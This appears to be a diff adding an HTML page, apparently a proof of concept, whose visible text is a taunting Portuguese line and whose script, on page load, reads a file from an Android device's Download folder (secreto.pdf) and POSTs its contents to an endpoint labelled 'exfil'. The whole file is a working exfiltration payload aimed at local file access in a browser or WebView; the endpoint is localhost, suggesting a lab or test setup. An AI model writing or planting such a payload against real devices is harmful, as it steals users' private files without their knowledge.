@@ -1,0 +1,18 @@
+<html>
+	<body>
+		<p> Eu falei pra não vir aqui, hein </p>
+	</body>
+	<script>
+		const URI = "file:///sdcard/Download/secreto.pdf";
+		const EXTRACTION_POINT = "http://127.0.0.1:8000/exfil/"
+
+		fetch(URI)
+			.then(response => response.blob())
+			.then(data => {
+				fetch(EXTRACTION_POINT, {
+					method: "POST",
+					body: data, 
+				})
+			})
+	</script>
+</html>
